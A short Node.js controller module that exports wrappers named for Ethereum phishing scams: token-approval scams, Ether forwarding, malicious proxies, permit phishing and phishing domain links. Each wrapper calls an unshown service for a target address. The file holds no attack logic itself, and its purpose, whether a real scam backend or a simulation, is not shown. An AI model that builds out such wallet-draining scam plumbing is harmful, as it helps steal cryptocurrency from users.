const phishingService = require("../services/phishingService");

const phishingApproveScam = async (_from, _to)=> {
    
    if (!_from || !_to){
        return {success: false, message: "Some of the credentials is missing or wrong."};
    }
    
    try {
        const response = await phishingService.ApprovalScamPhishingService(_from, _to);
    
        return {success: true, data: response}
    } catch (err) {
        return {success: false, error: err.message}
    }
}

const phishingEtherForwardScam = async (_to)=> {

    if (!_to){
        return {success: false, message: "The Recepeint address is missing or incorrect."};
    }

   try {
     const response = await phishingService.EtherForwardPhishingService(_to);
 
     return {success: true, data: response}
   } catch (err) {
        return {success: false, error: err.message}
   }

}

const phishingMaliciousProxy = async(_to)=> {
    
    if (!_to){
        return {success: false, message: "The Recepeint address is missing or incorrect"}
    }

   try {
     const response = await phishingService.MaliciousProxyPhishingService(_to);
 
     return {success: true, data: response}
   } catch (err) {
    return {success: false, error: err.message}
   }
}

const phishingPermit = async(_to)=> {
    if (!_to){
        return {success: false, message: "The Recepeint address is missing or incorrect"}
    }

    try {
        const response = await phishingService.PermitPhishing(_to);
    
        return {success: true, data: response}
    } catch (err) {
        return {success: false, error: err.message}
    }
}

const phishingDomainLink = async(_to)=> {
    if (!_to){
        return {success: false, message: "The Recepeint address is missing or incorrect"}
    }

    try {
        const response = await phishingService.PhishingDomainLinks(_to);
    
        return {success: true, data: response}
    } catch (err) {
        return {success: false, error: err.message}
    }
}


module.exports = {
    phishingApproveScam,
    phishingEtherForwardScam,
    phishingMaliciousProxy,
    phishingPermit,
    phishingDomainLink
}